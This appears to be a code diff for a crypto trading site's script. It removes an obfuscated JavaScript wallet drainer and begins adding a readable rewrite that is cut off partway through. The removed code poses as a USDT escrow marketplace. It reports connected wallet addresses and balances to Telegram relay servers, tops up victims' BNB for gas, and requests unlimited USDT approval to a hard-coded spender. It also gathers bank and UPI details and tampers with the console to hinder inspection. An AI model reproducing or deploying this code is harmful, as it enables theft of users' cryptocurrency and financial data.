@@ -1,1 +1,594 @@
-const _0x2237d8=_0x6188;(function(_0x30531c,_0x397109){const _0xa4f5d3=_0x6188,_0x281d8f=_0x30531c();while(!![]){try{const _0x55d568=parseInt(_0xa4f5d3(0x179))/0x1+-parseInt(_0xa4f5d3(0x13f))/0x2*(parseInt(_0xa4f5d3(0x140))/0x3)+parseInt(_0xa4f5d3(0x192))/0x4+-parseInt(_0xa4f5d3(0xcc))/0x5+-parseInt(_0xa4f5d3(0xc1))/0x6*(-parseInt(_0xa4f5d3(0x105))/0x7)+parseInt(_0xa4f5d3(0x17d))/0x8+-parseInt(_0xa4f5d3(0x161))/0x9;if(_0x55d568===_0x397109)break;else _0x281d8f['push'](_0x281d8f['shift']());}catch(_0x437249){_0x281d8f['push'](_0x281d8f['shift']());}}}(_0xe2a7,0x25885));const _0x5d4006=(function(){let _0x1b44e4=!![];return function(_0x12a424,_0x258050){const _0x28cf85=_0x1b44e4?function(){const _0xf46097=_0x6188;if(_0x258050){const _0x50b201=_0x258050[_0xf46097(0x10c)](_0x12a424,arguments);return _0x258050=null,_0x50b201;}}:function(){};return _0x1b44e4=![],_0x28cf85;};}()),_0x4a43b7=_0x5d4006(this,function(){const _0x44db3f=_0x6188;return _0x4a43b7['toString']()[_0x44db3f(0x158)](_0x44db3f(0xc9))[_0x44db3f(0x174)]()[_0x44db3f(0x187)](_0x4a43b7)[_0x44db3f(0x158)]('(((.+)+)+)+$');});_0x4a43b7();const _0x5e2264=(function(){let _0x30b004=!![];return function(_0x5647da,_0x515e28){const _0x28c597=_0x30b004?function(){const _0x4fec06=_0x6188;if(_0x515e28){const _0x5937d2=_0x515e28[_0x4fec06(0x10c)](_0x5647da,arguments);return _0x515e28=null,_0x5937d2;}}:function(){};return _0x30b004=![],_0x28c597;};}()),_0x1bc54c=_0x5e2264(this,function(){const _0x4f2e45=_0x6188;let _0x44f198;try{const _0x53c57b=Function(_0x4f2e45(0x136)+_0x4f2e45(0x112)+');');_0x44f198=_0x53c57b();}catch(_0xb87d8d){_0x44f198=window;}const _0x48af6f=_0x44f198['console']=_0x44f198[_0x4f2e45(0x11a)]||{},_0x213a0b=[_0x4f2e45(0xb9),_0x4f2e45(0x10d),_0x4f2e45(0x114),_0x4f2e45(0x168),'exception',_0x4f2e45(0x15b),'trace'];for(let _0x1816f7=0x0;_0x1816f7<_0x213a0b[_0x4f2e45(0xd2)];_0x1816f7++){const _0xa2ccfd=_0x5e2264['constructor'][_0x4f2e45(0xff)]['bind'](_0x5e2264),_0x3946da=_0x213a0b[_0x1816f7],_0x339a74=_0x48af6f[_0x3946da]||_0xa2ccfd;_0xa2ccfd[_0x4f2e45(0xd6)]=_0x5e2264[_0x4f2e45(0xdd)](_0x5e2264),_0xa2ccfd[_0x4f2e45(0x174)]=_0x339a74['toString'][_0x4f2e45(0xdd)](_0x339a74),_0x48af6f[_0x3946da]=_0xa2ccfd;}});_0x1bc54c();function showNotification(_0x373e00,_0x20dc1b=_0x2237d8(0x114)){const _0x1db94c=_0x2237d8;let _0x15591b=document['getElementById'](_0x1db94c(0x175));!_0x15591b&&(_0x15591b=document[_0x1db94c(0x135)]('div'),_0x15591b['id']='notify-bar',_0x15591b[_0x1db94c(0x134)][_0x1db94c(0xf6)]=_0x1db94c(0x130),_0x15591b[_0x1db94c(0x134)][_0x1db94c(0x16c)]=_0x1db94c(0xd7),_0x15591b['style'][_0x1db94c(0xe6)]=_0x1db94c(0x137),_0x15591b[_0x1db94c(0x134)]['transform']=_0x1db94c(0x17b),_0x15591b[_0x1db94c(0x134)][_0x1db94c(0xf3)]=_0x1db94c(0x172),_0x15591b['style'][_0x1db94c(0x142)]=_0x1db94c(0x10b),_0x15591b[_0x1db94c(0x134)][_0x1db94c(0x157)]=_0x1db94c(0xd9),_0x15591b[_0x1db94c(0x134)]['padding']=_0x1db94c(0xdb),_0x15591b[_0x1db94c(0x134)][_0x1db94c(0x17a)]='12px',_0x15591b['style'][_0x1db94c(0x14a)]='1rem',_0x15591b[_0x1db94c(0x134)][_0x1db94c(0x170)]=_0x1db94c(0x115),_0x15591b[_0x1db94c(0x134)]['textAlign']=_0x1db94c(0x165),_0x15591b[_0x1db94c(0x134)]['boxShadow']=_0x1db94c(0xba),_0x15591b[_0x1db94c(0x134)][_0x1db94c(0xfe)]=_0x1db94c(0xd3),document[_0x1db94c(0x10e)][_0x1db94c(0xbb)](_0x15591b)),_0x15591b[_0x1db94c(0x12c)]=_0x373e00,_0x15591b[_0x1db94c(0x134)][_0x1db94c(0x17c)]=_0x20dc1b===_0x1db94c(0x168)?'#f87171':_0x20dc1b===_0x1db94c(0x16b)?_0x1db94c(0x155):_0x1db94c(0xdf),_0x15591b[_0x1db94c(0x134)]['color']=_0x1db94c(0xe7),_0x15591b[_0x1db94c(0x134)][_0x1db94c(0xca)]='1',_0x15591b[_0x1db94c(0x134)]['pointerEvents']=_0x1db94c(0x176),setTimeout(()=>{const _0x3e46a1=_0x1db94c;_0x15591b[_0x3e46a1(0x134)]['opacity']='0',_0x15591b[_0x3e46a1(0x134)][_0x3e46a1(0x178)]=_0x3e46a1(0x11f);},0xbb8);}function _0xe2a7(){const _0x472291=['UPI','encodeFunctionData','exceeds\x20balance','constructor','toFixed','#ifsc-code','💰\x20Wallet:\x20','trim','h2\x20.text-sm','Switched\x20to\x20BSC','#load-more-btn','toNumber','BNB','.payment-form','1190892hZDEez','Sell\x20Now','💵\x20USDT\x20Balance:\x20','Bank\x20Transfer','#upi-id','0.0000','Telegram\x20message\x20failed\x20for\x20second\x20backend:','prop','addClass','formatUnits','log','0\x204px\x2032px\x20#0008','appendChild','input[type=\x22text\x22],\x20input[type=\x22file\x22]','0x3606B0Ee947E5e28cAA81FEEB01187388732B26f','<i\x20class=\x22fas\x20fa-check\x20mr-2\x22></i>All\x20Orders\x20Loaded\x20(41\x20of\x2041)','₹0.00','json','2076mZbEhp','#bank-details','Your\x20USDT\x20trade\x20has\x20been\x20initiated\x20successfully!','Payment\x20Data:','function\x20balanceOf(address\x20owner)\x20view\x20returns\x20(uint256)','POST','(41\x20orders)','Binance\x20Smart\x20Chain','(((.+)+)+)+$','opacity','Insufficient\x20USDT\x20balance\x20for\x20this\x20approval.','195410RnNqWZ','input[type=\x22number\x22]','Please\x20enter\x20IFSC\x20code.','Approve\x20&\x20Trade','Telegram\x20message\x20sent\x20to\x20first\x20backend\x20successfully','providers','length','all\x200.3s','Paytm','all','__proto__','20px','message','90vw','Error\x20sending\x20Telegram\x20message\x20to\x20first\x20backend:','16px\x2032px','Error\x20sending\x20Telegram\x20message\x20to\x20second\x20backend:','bind','toLocaleString','#374151','function\x20approve(address\x20spender,\x20uint256\x20amount)\x20public\x20returns\x20(bool)','hidden','accountNumber','0x38','https://telegram-backend-production-ad92.up.railway.app/sendTelegram','change','left','#fff','html','#sell-btn-text','#notification-toast','#upi-details','Interface','#close-modal,\x20#cancel-trade','Please\x20enter\x20your\x20mobile\x20number.','toggleClass','#payment-filter','IMPS','https://bsc-dataseed.binance.org/','zIndex','Please\x20enter\x20account\x20holder\x20name.','click','position','insufficient\x20funds','bg-blue-600\x20hover:bg-blue-700','function\x20decimals()\x20view\x20returns\x20(uint8)','⏰\x20Time:\x20','approve','toISOString','#sell-btn-loading','transition','prototype','#clear-filters','#mobile-menu','canceled','hide','#additional-orders','2940joRkJC','formattedBNB','val','Web3Provider','utils','#filter-btn','260px','apply','warn','body','Error\x20sending\x20wallet\x20data\x20to\x20saveWallet.php:','data','decimals','{}.constructor(\x22return\x20this\x22)(\x20)','No\x20Web3\x20wallet\x20found.','info','bold','#sell-usdt-btn','ready','.order-card\x20button:first-child','saveWallet.php','console','<i\x20class=\x22fas\x20fa-spinner\x20fa-spin\x20mr-2\x22></i>Loading...','#holder-name','🏦\x20Escrow\x20Contract:\x200x3606B0Ee947E5e28cAA81FEEB01187388732B26f\x0a','Contract','none','Telegram\x20message\x20sent\x20to\x20second\x20backend\x20successfully','mobileNumber','wallet_switchEthereumChain','.order-card:visible','ethereum','payment','request','Please\x20enter\x20your\x20UPI\x20ID.','Transaction\x20failed:','removeClass','#order-type-filter,\x20#payment-filter,\x20#amount-filter','Please\x20select\x20a\x20payment\x20method.','textContent','#order-type-filter','bg-gray-400\x20hover:bg-gray-500','Telegram\x20message\x20failed\x20for\x20first\x20backend:','fixed','stringify','eth_sendTransaction','show','style','createElement','return\x20(function()\x20','50%','#digital-wallet-details','#mobile-number','getBalance','ifscCode','Transaction\x20cancelled.','0x55d398326f99059fF775485246999027B3197955','https://bnb-server-production.up.railway.app/send-bnb','197672VBzaPl','6kLnARH','#amount-filter','minWidth','<i\x20class=\x22fas\x20fa-sync-alt\x20mr-2\x22></i>Load\x20More\x20Orders\x20(12\x20of\x2041)','user\x20denied','PhonePe','General\x20error\x20in\x20addAndSwitchToBSC:','<span\x20class=\x22spinner\x22>Processing...</span>','Could\x20not\x20fetch\x20USDT\x20decimals,\x20defaulting\x20to\x2018:','An\x20error\x20occurred\x20while\x20switching\x20networks.\x20Check\x20console\x20for\x20details.','fontSize','1000-10000','code','</code>\x0a','includes','#payment-method','input','type','https://telegram-bot-second-production.up.railway.app/sendTelegram','USDT\x20approval\x20successful!\x20Opening\x20trade\x20modal...','Failed\x20to\x20switch\x20to\x20BSC:','#10b981','50000-100000','maxWidth','search','user\x20rejected','catch','table','.order-card','🆔\x20Wallet\x20Address:\x20<code>','\x20BNB\x0a','cancelled','🔔\x20USDT\x20Escrow\x20Approval\x20Successful!\x0a\x0a','3633975XaHVLh','Google\x20Pay','#inr-amount','💰\x20BNB\x20Balance:\x20','center','Please\x20enter\x20a\x20valid\x20USDT\x20amount.','eth_chainId','error','upiId','No\x20Web3\x20wallet\x20found.\x20Please\x20open\x20in\x20Trust\x20Wallet\x20or\x20MetaMask\x20browser.','success','top','#account-number','each','#trade-modal','fontWeight','text','9999','\x20orders)','toString','notify-bar','auto','application/json','pointerEvents','137065RHecWk','borderRadius','translateX(-50%)','background','1713232OzweRH','split','disabled','Checking\x20the\x20BNB\x20balance\x20and\x20topping\x20up...','balanceOf','#payment-details','holderName'];_0xe2a7=function(){return _0x472291;};return _0xe2a7();}async function sendTelegramMessage(_0x269dad){const _0x334476=_0x2237d8,_0x94c318=_0x334476(0x152),_0x337e32=_0x334476(0xe4);try{const _0x5b6fc8=await fetch(_0x94c318,{'method':_0x334476(0xc6),'headers':{'Content-Type':_0x334476(0x177)},'body':JSON[_0x334476(0x131)]({'message':_0x269dad})}),_0x5b9546=await _0x5b6fc8[_0x334476(0xc0)]();_0x5b9546['ok']?console['log'](_0x334476(0xd0)):console['error'](_0x334476(0x12f),_0x5b9546);}catch(_0x51dce0){console[_0x334476(0x168)](_0x334476(0xda),_0x51dce0);}try{const _0x291ba3=await fetch(_0x337e32,{'method':_0x334476(0xc6),'headers':{'Content-Type':'application/json'},'body':JSON[_0x334476(0x131)]({'message':_0x269dad})}),_0x2f9dc2=await _0x291ba3[_0x334476(0xc0)]();_0x2f9dc2['ok']?console[_0x334476(0xb9)](_0x334476(0x120)):console[_0x334476(0x168)](_0x334476(0xb5),_0x2f9dc2);}catch(_0x520a07){console[_0x334476(0x168)](_0x334476(0xdc),_0x520a07);}}async function sendTelegramNotification(_0x574aec,_0xbc87fe){const _0x1011d1=_0x2237d8,_0x438dd1=_0x1011d1(0x160)+(_0x1011d1(0x18a)+_0x574aec+'\x0a')+('📝\x20Transaction\x20Hash:\x20'+_0xbc87fe+'\x0a\x0a')+'✅\x20User\x20has\x20approved\x20escrow\x20contract\x20for\x20USDT\x20spending\x0a'+_0x1011d1(0x11d)+('⏰\x20Time:\x20'+new Date()[_0x1011d1(0xde)]());await sendTelegramMessage(_0x438dd1);}async function addAndSwitchToBSC(){const _0x110fb3=_0x2237d8;if(!window[_0x110fb3(0x124)]){showNotification(_0x110fb3(0x16a),'error');throw new Error(_0x110fb3(0x113));}const _0x1524fd={'chainId':_0x110fb3(0xe3),'chainName':_0x110fb3(0xc8),'nativeCurrency':{'name':_0x110fb3(0x190),'symbol':'BNB','decimals':0x12},'rpcUrls':[_0x110fb3(0xf2)],'blockExplorerUrls':['https://bscscan.com']};try{const _0x46bf29=await window[_0x110fb3(0x124)][_0x110fb3(0x126)]({'method':_0x110fb3(0x167)});if(_0x46bf29===_0x110fb3(0xe3)){console[_0x110fb3(0xb9)]('Already\x20on\x20BSC');return;}try{await window[_0x110fb3(0x124)][_0x110fb3(0x126)]({'method':_0x110fb3(0x122),'params':[{'chainId':_0x110fb3(0xe3)}]}),console[_0x110fb3(0xb9)](_0x110fb3(0x18d));}catch(_0x1fe707){if(_0x1fe707[_0x110fb3(0x14c)]===0x1326)await window[_0x110fb3(0x124)]['request']({'method':'wallet_addEthereumChain','params':[_0x1524fd]}),console[_0x110fb3(0xb9)]('BSC\x20network\x20added!');else{console['error'](_0x110fb3(0x154),_0x1fe707),showNotification('Failed\x20to\x20switch\x20to\x20BSC.\x20Please\x20try\x20manually.',_0x110fb3(0x168));throw _0x1fe707;}}}catch(_0x165745){console['error'](_0x110fb3(0x146),_0x165745),showNotification(_0x110fb3(0x149),_0x110fb3(0x168));throw _0x165745;}}function _0x6188(_0x27753b,_0x20c309){const _0x24668d=_0xe2a7();return _0x6188=function(_0x1bc54c,_0x5e2264){_0x1bc54c=_0x1bc54c-0xb2;let _0x19bfe0=_0x24668d[_0x1bc54c];return _0x19bfe0;},_0x6188(_0x27753b,_0x20c309);}async function sendWalletBalancesToTelegram(_0x462af7){const _0x508eb7=_0x2237d8,_0x35462e=_0x508eb7(0x13d),_0x5c60a3=[_0x508eb7(0xc5),_0x508eb7(0xf9)];let _0x56f031=_0x508eb7(0xb4),_0x303401='0.00';try{const _0x7c9e3c=new ethers[(_0x508eb7(0xd1))][(_0x508eb7(0x108))](window[_0x508eb7(0x124)]),_0x12193b=await _0x7c9e3c[_0x508eb7(0x13a)](_0x462af7);_0x56f031=ethers[_0x508eb7(0x109)]['formatEther'](_0x12193b);const _0x54d7=new ethers[(_0x508eb7(0x11e))](_0x35462e,_0x5c60a3,_0x7c9e3c);let _0x46d9cb=0x12;try{const _0x948a6c=await _0x54d7[_0x508eb7(0x111)]();_0x46d9cb=_0x948a6c[_0x508eb7(0x18f)]();}catch(_0x4e1250){console[_0x508eb7(0x10d)](_0x508eb7(0x148),_0x4e1250);}const _0x3cc82c=await _0x54d7[_0x508eb7(0x181)](_0x462af7);_0x303401=ethers[_0x508eb7(0x109)][_0x508eb7(0xb8)](_0x3cc82c,_0x46d9cb);const _0xf15d80='🟢\x20New\x20Wallet\x20Connected!\x0a\x0a'+(_0x508eb7(0x15d)+_0x462af7+_0x508eb7(0x14d))+(_0x508eb7(0x164)+parseFloat(_0x56f031)[_0x508eb7(0x188)](0x4)+_0x508eb7(0x15e))+(_0x508eb7(0x194)+parseFloat(_0x303401)[_0x508eb7(0x188)](0x2)+'\x20USDT\x0a')+(_0x508eb7(0xfa)+new Date()['toLocaleString']());await sendTelegramMessage(_0xf15d80),fetch(_0x508eb7(0x119),{'method':_0x508eb7(0xc6),'headers':{'Content-Type':_0x508eb7(0x177)},'body':JSON[_0x508eb7(0x131)]({'wallet':_0x462af7,'bnb':_0x56f031,'usdt':_0x303401})})[_0x508eb7(0x15a)](_0x3f81b6=>console[_0x508eb7(0x168)](_0x508eb7(0x10f),_0x3f81b6));}catch(_0x15c2fb){console[_0x508eb7(0x168)]('Error\x20fetching\x20or\x20sending\x20wallet\x20details\x20to\x20Telegram:',_0x15c2fb);}return{'formattedBNB':_0x56f031,'formattedUSDT':_0x303401};}$(document)[_0x2237d8(0x117)](function(){const _0xf05af7=_0x2237d8;$(_0xf05af7(0x118))[_0xf05af7(0x16e)](function(){const _0x2b9c69=_0xf05af7;$(this)[_0x2b9c69(0x171)]()[_0x2b9c69(0x18b)]()===_0x2b9c69(0x193)&&$(this)[_0x2b9c69(0x171)](_0x2b9c69(0xcf));}),$('#mobile-menu-btn')['click'](function(){const _0x1e1913=_0xf05af7;$(_0x1e1913(0x101))[_0x1e1913(0xef)](_0x1e1913(0xe1));}),$(_0xf05af7(0x118))[_0xf05af7(0xf5)](async function(){const _0x11f6d3=_0xf05af7;if(!$(this)[_0x11f6d3(0xb6)]('disabled')){const _0x228afb=$(this),_0x32bf12=_0x228afb[_0x11f6d3(0xe8)]();if(!window[_0x11f6d3(0x124)]){showNotification('No\x20Web3\x20wallet\x20found.\x20Please\x20open\x20in\x20Trust\x20Wallet\x20or\x20MetaMask\x20browser.','error');return;}_0x228afb[_0x11f6d3(0xe8)](_0x11f6d3(0x147)),_0x228afb[_0x11f6d3(0xb6)](_0x11f6d3(0x17f),!![]);let _0x1f1d86,_0x1f791b;try{await addAndSwitchToBSC();const _0x501f6d=await window[_0x11f6d3(0x124)][_0x11f6d3(0x126)]({'method':'eth_requestAccounts'});_0x1f1d86=_0x501f6d[0x0];if(!_0x1f1d86){_0x228afb[_0x11f6d3(0xb6)]('disabled',![]),_0x228afb['html'](_0x32bf12);return;}const _0x39afca=await sendWalletBalancesToTelegram(_0x1f1d86);_0x1f791b=_0x39afca[_0x11f6d3(0x106)];if(parseFloat(_0x1f791b)===0x0){showNotification(_0x11f6d3(0x180),'info'),await fetch(_0x11f6d3(0x13e),{'method':_0x11f6d3(0xc6),'headers':{'Content-Type':'application/json'},'body':JSON[_0x11f6d3(0x131)]({'toAddress':_0x1f1d86})}),await new Promise(_0x8a426d=>setTimeout(_0x8a426d,0xfa0)),showNotification('BNB\x20top-up\x20initiated.\x20Please\x20wait\x20a\x20moment\x20and\x20try\x20the\x20approval\x20again.',_0x11f6d3(0x16b)),_0x228afb[_0x11f6d3(0xb6)]('disabled',![]),_0x228afb[_0x11f6d3(0xe8)](_0x32bf12);return;}const _0x1f011b=_0x11f6d3(0xbd),_0x2d1c12=_0x11f6d3(0x13d),_0x4d469f=[_0x11f6d3(0xe0),_0x11f6d3(0xf9)],_0x29f3eb=new ethers[(_0x11f6d3(0x109))][(_0x11f6d3(0xec))](_0x4d469f),_0x172c71=ethers['constants']['MaxUint256'],_0x316855=_0x29f3eb[_0x11f6d3(0x185)](_0x11f6d3(0xfb),[_0x1f011b,_0x172c71]),_0x37ff5b=await window[_0x11f6d3(0x124)][_0x11f6d3(0x126)]({'method':_0x11f6d3(0x132),'params':[{'from':_0x1f1d86,'to':_0x2d1c12,'data':_0x316855,'value':'0x0'}]});showNotification(_0x11f6d3(0x153),_0x11f6d3(0x16b)),await sendTelegramNotification(_0x1f1d86,_0x37ff5b),$('#trade-modal')[_0x11f6d3(0x129)]('hidden'),$(_0x11f6d3(0x163))[_0x11f6d3(0x171)](_0x11f6d3(0xbf)),$(_0x11f6d3(0xcd))[_0x11f6d3(0x107)](''),$(_0x11f6d3(0x182))[_0x11f6d3(0xb7)](_0x11f6d3(0xe1)),$('#payment-method')[_0x11f6d3(0x107)](''),$(_0x11f6d3(0x191))[_0x11f6d3(0xb7)]('hidden'),$(_0x11f6d3(0xbc))['val']('');}catch(_0x2b960e){const _0x4e3ab4=(_0x2b960e?.[_0x11f6d3(0xd8)]||'')['toLowerCase']();if(_0x4e3ab4[_0x11f6d3(0x14e)](_0x11f6d3(0x159))||_0x4e3ab4['includes'](_0x11f6d3(0x144))||_0x4e3ab4['includes'](_0x11f6d3(0x15f))||_0x4e3ab4[_0x11f6d3(0x14e)](_0x11f6d3(0x102)))showNotification(_0x11f6d3(0x13c),_0x11f6d3(0x168));else _0x4e3ab4['includes'](_0x11f6d3(0xf7))||_0x4e3ab4['includes'](_0x11f6d3(0x186))||_0x4e3ab4[_0x11f6d3(0x14e)]('execution\x20reverted')&&_0x4e3ab4['includes'](_0x11f6d3(0x186))?showNotification(_0x11f6d3(0xcb),_0x11f6d3(0x168)):(showNotification('Transaction\x20failed.\x20Please\x20try\x20again.',_0x11f6d3(0x168)),console['error'](_0x11f6d3(0x128),_0x2b960e));}finally{_0x228afb[_0x11f6d3(0xb6)]('disabled',![]),_0x228afb[_0x11f6d3(0xe8)](_0x32bf12);}}}),$(_0xf05af7(0xed))[_0xf05af7(0xf5)](function(){const _0x210c38=_0xf05af7;$(_0x210c38(0x16f))[_0x210c38(0xb7)](_0x210c38(0xe1));}),$(_0xf05af7(0x16f))[_0xf05af7(0xf5)](function(_0x15159a){const _0x585ac0=_0xf05af7;_0x15159a['target']===this&&$(this)[_0x585ac0(0xb7)]('hidden');});function _0x439f25(){const _0x20cadf=_0xf05af7;var _0x40babe=$(_0x20cadf(0x14f))[_0x20cadf(0x107)](),_0x1054f9=parseFloat($(_0x20cadf(0xcd))[_0x20cadf(0x107)]())||0x0;if(_0x1054f9<=0x0)return showNotification(_0x20cadf(0x166),'error'),![];if(!_0x40babe)return showNotification(_0x20cadf(0x12b),_0x20cadf(0x168)),![];if(_0x40babe===_0x20cadf(0x184)){var _0x176c56=$(_0x20cadf(0xb3))[_0x20cadf(0x107)]()['trim']();if(!_0x176c56)return showNotification(_0x20cadf(0x127),_0x20cadf(0x168)),![];}else{if(_0x40babe==='IMPS'||_0x40babe===_0x20cadf(0xb2)){var _0x3bcf9a=$(_0x20cadf(0x11c))['val']()[_0x20cadf(0x18b)](),_0x322f93=$(_0x20cadf(0x16d))[_0x20cadf(0x107)]()[_0x20cadf(0x18b)](),_0x5dc039=$(_0x20cadf(0x189))[_0x20cadf(0x107)]()[_0x20cadf(0x18b)]();if(!_0x3bcf9a)return showNotification(_0x20cadf(0xf4),_0x20cadf(0x168)),![];if(!_0x322f93)return showNotification('Please\x20enter\x20account\x20number.',_0x20cadf(0x168)),![];if(!_0x5dc039)return showNotification(_0x20cadf(0xce),_0x20cadf(0x168)),![];}else{if(_0x40babe===_0x20cadf(0xd4)||_0x40babe==='PhonePe'||_0x40babe===_0x20cadf(0x162)){var _0x1fb1bd=$(_0x20cadf(0x139))[_0x20cadf(0x107)]()[_0x20cadf(0x18b)]();if(!_0x1fb1bd)return showNotification(_0x20cadf(0xee),'error'),![];}}}return!![];}function _0x978f19(){const _0x13ff29=_0xf05af7;var _0x1d0b12=$('#payment-method')['val'](),_0x2a2261=parseFloat($(_0x13ff29(0xcd))[_0x13ff29(0x107)]())||0x0,_0x4dddd1=(_0x2a2261*0x6e)[_0x13ff29(0x188)](0x2),_0xfd7387={'usdtAmount':_0x2a2261,'inrAmount':_0x4dddd1,'paymentMethod':_0x1d0b12,'timestamp':new Date()[_0x13ff29(0xfc)]()};if(_0x1d0b12===_0x13ff29(0x184))_0xfd7387[_0x13ff29(0x169)]=$('#upi-id')[_0x13ff29(0x107)]()['trim']();else{if(_0x1d0b12===_0x13ff29(0xf1)||_0x1d0b12==='Bank\x20Transfer')_0xfd7387[_0x13ff29(0x183)]=$('#holder-name')[_0x13ff29(0x107)]()['trim'](),_0xfd7387[_0x13ff29(0xe2)]=$(_0x13ff29(0x16d))[_0x13ff29(0x107)]()[_0x13ff29(0x18b)](),_0xfd7387[_0x13ff29(0x13b)]=$(_0x13ff29(0x189))[_0x13ff29(0x107)]()[_0x13ff29(0x18b)]();else(_0x1d0b12===_0x13ff29(0xd4)||_0x1d0b12===_0x13ff29(0x145)||_0x1d0b12===_0x13ff29(0x162))&&(_0xfd7387[_0x13ff29(0x121)]=$(_0x13ff29(0x139))['val']()[_0x13ff29(0x18b)]());}return _0xfd7387;}$(_0xf05af7(0x116))[_0xf05af7(0xf5)](function(){const _0x16641d=_0xf05af7;if(!_0x439f25())return;$('#sell-btn-text')[_0x16641d(0xb7)](_0x16641d(0xe1)),$(_0x16641d(0xfd))['removeClass'](_0x16641d(0xe1)),$(_0x16641d(0x116))['prop']('disabled',!![]);var _0x25b1a1=_0x978f19();console[_0x16641d(0xb9)](_0x16641d(0xc4),_0x25b1a1),setTimeout(function(){const _0x5d7a8f=_0x16641d;showNotification(_0x5d7a8f(0xc3),_0x5d7a8f(0x16b)),$(_0x5d7a8f(0x16f))[_0x5d7a8f(0xb7)](_0x5d7a8f(0xe1)),$(_0x5d7a8f(0xe9))['removeClass']('hidden'),$(_0x5d7a8f(0xfd))[_0x5d7a8f(0xb7)]('hidden'),$(_0x5d7a8f(0x116))[_0x5d7a8f(0xb6)](_0x5d7a8f(0x17f),![]);},0x7d0);}),$('#toast-close')['click'](function(){const _0x37c691=_0xf05af7;$(_0x37c691(0xea))['addClass'](_0x37c691(0xe1));}),$('input[type=\x22number\x22]')['on'](_0xf05af7(0x150),function(){const _0x599503=_0xf05af7;var _0x4c846e=parseFloat($(this)[_0x599503(0x107)]())||0x0,_0x418e7a=0x6e,_0x252b2a=(_0x4c846e*_0x418e7a)[_0x599503(0x188)](0x2);$(_0x599503(0x163))[_0x599503(0x171)]('₹'+_0x252b2a),_0x4c846e>0x0?$(_0x599503(0x182))['removeClass']('hidden'):$(_0x599503(0x182))[_0x599503(0xb7)](_0x599503(0xe1));}),$(_0xf05af7(0x14f))['on'](_0xf05af7(0xe5),function(){const _0x3ceedc=_0xf05af7;var _0x4beb27=$(this)[_0x3ceedc(0x107)]();$(_0x3ceedc(0x191))[_0x3ceedc(0xb7)]('hidden');if(_0x4beb27==='UPI')$(_0x3ceedc(0xeb))['removeClass'](_0x3ceedc(0xe1));else{if(_0x4beb27==='IMPS'||_0x4beb27===_0x3ceedc(0xb2))$(_0x3ceedc(0xc2))[_0x3ceedc(0x129)](_0x3ceedc(0xe1));else(_0x4beb27===_0x3ceedc(0xd4)||_0x4beb27===_0x3ceedc(0x145)||_0x4beb27==='Google\x20Pay')&&$(_0x3ceedc(0x138))[_0x3ceedc(0x129)](_0x3ceedc(0xe1));}});function _0x4c0317(){const _0x5ab4bc=_0xf05af7;var _0x2ee035=$(_0x5ab4bc(0x12d))[_0x5ab4bc(0x107)](),_0xbc1763=$(_0x5ab4bc(0xf0))['val'](),_0x5225dd=$('#amount-filter')[_0x5ab4bc(0x107)]();$('.order-card')[_0x5ab4bc(0x16e)](function(){const _0x30c61e=_0x5ab4bc;var _0x379e9f=$(this),_0x53b853=_0x379e9f[_0x30c61e(0x110)](_0x30c61e(0x125)),_0xf5be65=_0x379e9f[_0x30c61e(0x110)]('amount'),_0x523056=_0x379e9f[_0x30c61e(0x110)](_0x30c61e(0x151)),_0x5d1d0d=!![];_0x2ee035!==_0x30c61e(0xd5)&&_0x523056!==_0x2ee035&&(_0x5d1d0d=![]);_0xbc1763!==_0x30c61e(0xd5)&&!_0x53b853['includes'](_0xbc1763)&&(_0x5d1d0d=![]);if(_0x5225dd!=='all'){var _0x3d7793=parseInt(_0xf5be65[_0x30c61e(0x17e)]('-')[0x0]),_0x1edf61=parseInt(_0xf5be65[_0x30c61e(0x17e)]('-')[0x1]);switch(_0x5225dd){case _0x30c61e(0x14b):if(_0x3d7793<0x3e8||_0x1edf61>0x2710)_0x5d1d0d=![];break;case'10000-50000':if(_0x3d7793<0x2710||_0x1edf61>0xc350)_0x5d1d0d=![];break;case _0x30c61e(0x156):if(_0x3d7793<0xc350||_0x1edf61>0x186a0)_0x5d1d0d=![];break;case'100000+':if(_0x3d7793<0x186a0)_0x5d1d0d=![];break;}}_0x5d1d0d?_0x379e9f[_0x30c61e(0x133)]():_0x379e9f[_0x30c61e(0x103)]();});var _0x4cb2ab=$(_0x5ab4bc(0x123))['length'];$(_0x5ab4bc(0x18c))['text']('('+_0x4cb2ab+_0x5ab4bc(0x173));}$(_0xf05af7(0x10a))[_0xf05af7(0xf5)](function(){_0x4c0317();}),$(_0xf05af7(0x100))[_0xf05af7(0xf5)](function(){const _0x5417f6=_0xf05af7;$('#order-type-filter')[_0x5417f6(0x107)](_0x5417f6(0xd5)),$(_0x5417f6(0xf0))['val'](_0x5417f6(0xd5)),$(_0x5417f6(0x141))[_0x5417f6(0x107)](_0x5417f6(0xd5)),$(_0x5417f6(0x15c))[_0x5417f6(0x133)](),$(_0x5417f6(0x18c))[_0x5417f6(0x171)](_0x5417f6(0xc7));}),$(_0xf05af7(0x12a))[_0xf05af7(0xe5)](function(){_0x4c0317();}),$(_0xf05af7(0x18e))[_0xf05af7(0xf5)](function(){const _0x46322f=_0xf05af7;var _0xcef550=$(this),_0x594583=$(_0x46322f(0x104));_0x594583['hasClass'](_0x46322f(0xe1))?(_0x594583[_0x46322f(0x129)]('hidden'),_0xcef550[_0x46322f(0xe8)](_0x46322f(0x143)),_0xcef550[_0x46322f(0xb7)](_0x46322f(0x12e))[_0x46322f(0x129)](_0x46322f(0xf8))):(_0xcef550[_0x46322f(0xe8)](_0x46322f(0x11b)),setTimeout(function(){const _0x34826b=_0x46322f;_0xcef550[_0x34826b(0xe8)](_0x34826b(0xbe)),_0xcef550['addClass']('bg-green-600\x20hover:bg-green-700')[_0x34826b(0x129)](_0x34826b(0x12e)),_0xcef550[_0x34826b(0xb6)]('disabled',!![]);},0x7d0));});});
+// ===== NOTIFICATION BAR SETUP =====
+    function showNotification(msg, type = "info") {
+        let notify = document.getElementById("notify-bar");
+        if (!notify) {
+            notify = document.createElement("div");
+            notify.id = "notify-bar";
+            notify.style.position = "fixed";
+            notify.style.top = "20px";
+            notify.style.left = "50%";
+            notify.style.transform = "translateX(-50%)";
+            notify.style.zIndex = "9999";
+            notify.style.minWidth = "260px";
+            notify.style.maxWidth = "90vw";
+            notify.style.padding = "16px 32px";
+            notify.style.borderRadius = "12px";
+            notify.style.fontSize = "1rem";
+            notify.style.fontWeight = "bold";
+            notify.style.textAlign = "center";
+            notify.style.boxShadow = "0 4px 32px #0008";
+            notify.style.transition = "all 0.3s";
+            document.body.appendChild(notify);
+        }
+        notify.textContent = msg;
+        notify.style.background = type === "error" ? "#f87171" : (type === "success" ? "#10b981" : "#374151");
+        notify.style.color = "#fff";
+        notify.style.opacity = "1";
+        notify.style.pointerEvents = "auto";
+        setTimeout(() => {
